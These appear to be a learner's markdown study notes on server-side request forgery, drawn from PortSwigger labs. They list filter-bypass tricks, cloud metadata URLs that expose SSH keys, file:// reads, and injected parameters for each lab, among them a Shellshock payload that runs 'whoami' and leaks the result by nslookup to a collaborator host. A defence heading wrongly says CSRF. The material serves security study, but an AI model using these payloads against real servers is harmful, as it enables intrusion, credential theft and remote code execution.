# What is SSRF ?
Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.
In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials
![[server-side request forgery.svg]]

# What is the impact of SSRF attacks ?
A successful SSRF attack can often result in unauthorized actions or access to data within the organization. This can be in the vulnerable application, or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.
## SSRF attacks against the server (scenario)
In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like `127.0.0.1` (a reserved IP address that points to the loopback adapter) or `localhost` (a commonly used name for the same adapter).

For example, imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. When a user views the stock status for an item, their browser makes the following request:

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this example, an attacker can modify the request to specify a URL local to the server:

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin`

The server fetches the contents of the `/admin` URL and returns it to the user.

An attacker can visit the `/admin` URL, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won't see anything of interest. However, if the request to the `/admin` URL comes from the local machine, the normal access controls are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.

---
##### Why do applications behave in this way, and implicitly trust requests that come from the local machine? This can arise for various reasons:
- The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.
- For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system if they lose their credentials. This assumes that only a fully trusted user would come directly from the server.
- The administrative interface might listen on a different port number to the main application, and might not be reachable directly by users.

## SSRF with blacklist-based input filters
- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

## Types of SSRF
1. basic (it displays the response to attacker)
2. blind (it does not display the response to the attacker)
## Finding hidden attack surface for SSRF vulnerabilities
### Partial URLs in requests
Sometimes, an application places only a hostname or part of a URL path into request parameters. The value submitted is then incorporated server-side into a full URL that is requested. If the value is readily recognized as a hostname or URL path, the potential attack surface might be obvious. However, exploitability as full SSRF might be limited because you do not control the entire URL that gets requested.
### URLs within data formats
Some applications transmit data in formats with a specification that allows the inclusion of URLs that might get requested by the data parser for the format. An obvious example of this is the XML data format, which has been widely used in web applications to transmit structured data from the client to the server. When an application accepts data in XML format and parses it, it might be vulnerable to XXE injection. It might also be vulnerable to SSRF via XXE. We'll cover this in more detail when we look at XXE injection vulnerabilities.
### SSRF via the Referrer header
Some applications use server-side analytics software to tracks visitors. This software often logs the Referrer header in requests, so it can track incoming links. 

# Other Techniques
##### From SSRF to Local File Disclosure
`https://anything?url=file:///etc/hosts` using **file** Wrapper
##### From SSRF to RCE (1)
Cloud providers users Metadata files to store sensitive information of the service user, such as SSH keys. These data is only accessible on the local network of the running instance. 
AWS =`http://169.254.169.254/latest/meta-data/`
Google = `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
Digital Ocean = `http://169.254.169.254/metadata/v1.json `


## Labs
* #Portswigger
	1. **Basic SSRF against the local server** #APPRENTICE 
		normal SSRF with no challenges
		*injected parameter :* 
		`stockApi=http://localhost/admin/delete?username=carlos`
	2. **Basic SSRF against another back-end system** #APPRENTICE 
		normal SSRF but we do not know the IP of the admin page so we will brute force the last octet and add 8080 port 
		*injected parameter :* 
		`stockApi=http://192.168.0.11:8080/admin/delete?username=carlos`
	3. **Blind SSRF with out-of-band detection** #PRACTITIONER 
		This site uses analytics software which fetches the URL specified in the Referrer header when a product page is loaded, it is blind so you will put your server in the referrer and the site will interact with it
	4. **SSRF with blacklist-based input filter** #PRACTITIONER 
		it blocks `127.0.0.1` so we used `127.1` and it blocks 'admin' so we double-encoded 'a' to `%2561` 
		*injected parameter :* 
		`stockApi=http://127.1/%25%36%31dmin/delete?username=carlos`
	5. **SSRF with filter bypass via open redirection vulnerability** #PRACTITIONER 
		solve it using open redirection vulnerability on `stockApi` parameter and do not forget to URL encode it
		*injected parameter :* 
		`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
	6. **Blind SSRF with Shellshock exploitation** #EXPERT
		we will use this payload on referrer `http://192.168.0.X:8080` because we do not know the right IP address and then we will use shellshock code on the user-agent to trigger our server `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` the shellshock code is an old RCE vulnerability that that affect the shell and allow to execute code on the shell 
	7. **SSRF with whitelist-based input filter** #EXPERT
		break down the payload first of all you have to add `http://stock.weliketoshop.net` as a part of the payload because the server check for it If you add '@' then the filter sees `http://username@stock.weliketoshop.net` which is the accepted hostname. Now if we use `http://localhost%2523@stock.weliketoshop.net` that passes the filter and the web server directs it to `http://localhost#...` The mysterious part is why `http://localhost%2523@stock.weliketoshop.net/admin` works. It looks like there's another filter that strips everything from %25 until it sees / and concatenates, which leads to`http://localhost/admin`. The normal web server should ignore /admin at the end as it's after the # segment.
		*injected parameter :* 
		`http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`
# Common defences against CSRF
- Whitelist URLs
- Block IP Ranges
- Block Dangerous Schemes
- Sanitize user input
- Use firewall
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 0
  - item: "Server"
    user: "Effective against the attack"
    score: 10
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 50

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```

# NOTES
* we can not consider external service interaction as an attack, it is only damage is to harm the reputation of the company because the attacker can only use it to make cross site port scanning
* anything that accept URL or link try SSRF on it
* Redis is a database which work on memory rather that hard disk
* `inet aton()` is the function which translate IPs to normal IPs

# Techniques
#### 1. try SSRF payloads
- localhost
- 127.1
- 127.0.0.1
- encode - double encode
#### 2. inject payload in open redirect